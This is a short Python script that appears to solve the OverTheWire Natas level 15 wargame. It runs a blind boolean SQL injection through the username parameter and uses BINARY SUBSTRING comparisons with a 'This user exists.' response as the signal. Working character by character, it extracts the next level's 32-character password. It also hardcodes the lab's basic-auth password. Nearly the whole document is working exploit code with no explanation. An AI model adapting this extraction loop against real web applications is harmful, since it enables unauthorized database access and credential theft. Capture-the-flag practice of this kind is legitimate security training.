#URL format: http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20and%20password=%223&debug
import requests
from requests.auth import HTTPBasicAuth

alphanumerics = map(chr, range(65,91)+range(97,123)+range(48,58))
	
passwd = ""

def build_url(passwrd): return "http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22%20and%20BINARY%20SUBSTRING%28password,1,%22" + str(len(passwrd)) + "%22%29=%22" + passwrd + "%22%20and%20%22a%22=%22a"

def is_success(password):
	resp = requests.get(build_url(password), auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
	return "This user exists." in resp.text


while len(passwd) < 32:
	for char in alphanumerics:
		print passwd+char
		if is_success(passwd+char):
			passwd += char
			break

print "Password =", passwd
